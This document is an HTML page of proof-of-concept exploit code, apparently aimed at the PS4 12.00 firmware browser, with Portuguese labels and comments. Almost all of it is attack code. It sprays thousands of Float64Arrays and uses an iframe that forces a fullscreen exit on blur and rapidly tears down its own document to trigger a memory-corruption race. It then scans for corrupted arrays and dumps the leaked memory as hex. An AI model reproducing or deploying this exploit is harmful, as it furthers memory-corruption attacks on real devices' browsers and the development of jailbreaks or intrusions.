<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>PS4 Fast Exit - Leandro</title>
</head>
<body style="background-color: #f4f4f9; font-family: sans-serif; padding: 20px;">

    <h1>PS4 12.00 - Fast Exit & Corruption</h1>
    <p>Status: <span id="status-pai" style="font-weight:bold; color: #555;">Aguardando...</span></p>

    <button onclick="prepareObjects()" style="padding: 12px;">1. Preparar Objetos</button>
    <button onclick="setupIframe()" style="padding: 12px;">2. Iframe (Gatilho Rápido)</button>
    <button onclick="checkPersistence()" style="padding: 12px; background-color: #c8e6c9;">3. Verificar Corrupção</button>

    <hr>
    <div id="leak-output" style="background: #222; color: #0f0; padding: 15px; font-family: monospace; display: none; border-radius: 5px;"></div>
    <div id="frame-container" style="margin-top: 20px;"></div>

    <script>
        const PATTERN = 2.121995791e-314; 
        let controllers = [];
        const statusPai = document.getElementById('status-pai');

        function prepareObjects() {
            controllers = [];
            for(let i = 0; i < 5000; i++) {
                let arr = new Float64Array(32);
                arr[0] = i; 
                controllers.push(arr);
            }
            statusPai.innerText = "5000 Objetos Prontos.";
            statusPai.style.color = "blue";
        }

        function setupIframe() {
            const container = document.getElementById('frame-container');
            container.innerHTML = '<iframe id="pocFrame" style="width:100%; height:150px; border:1px solid red;"></iframe>';
            const frame = document.getElementById('pocFrame');
            const fDoc = frame.contentWindow.document;

            fDoc.open();
            fDoc.write(`
                <html><body>
                    <button onclick="startPoC()" style="padding:10px;">START (FS + OPTIONS)</button>
                    <script>
                        window.startPoC = function() {
                            document.documentElement.webkitRequestFullscreen();
                            
                            window.onblur = function() {
                                // Forçamos a saída do Fullscreen IMEDIATAMENTE no Blur
                                if (document.webkitExitFullscreen) document.webkitExitFullscreen();

                                let spray = [];
                                for(let i = 0; i < 6000; i++) {
                                    spray.push(new Float64Array(32).fill(${PATTERN}));
                                }

                                // Teardown ultra-rápido (200ms) para garantir o conflito
                                setTimeout(() => {
                                    document.open();
                                    document.write('<h1>FINALIZADO</h1>');
                                    document.close();
                                }, 200); 
                            };
                        };
                    <\/script>
                </body></html>
            `);
            fDoc.close();
            statusPai.innerText = "Iframe Pronto. Tente novamente.";
        }

        function checkPersistence() {
            let corrupted = null;
            for(let i = 0; i < controllers.length; i++) {
                if (controllers[i][0] === PATTERN) {
                    corrupted = controllers[i];
                    break;
                }
            }

            const output = document.getElementById('leak-output');
            if (corrupted) {
                statusPai.innerText = "✓ CORRUPÇÃO DETECTADA!";
                output.style.display = "block";
                output.innerHTML = "";
                for(let i = 0; i < 32; i++) {
                    const buf = new ArrayBuffer(8);
                    new Float64Array(buf)[0] = corrupted[i];
                    const hex = new BigUint64Array(buf)[0].toString(16).padStart(16, '0');
                    output.innerHTML += "O["+i+"]: 0x" + hex + "<br>";
                }
            } else {
                statusPai.innerText = "✗ FALHA: Sem corrupção.";
            }
        }
    </script>
</body>
</html>
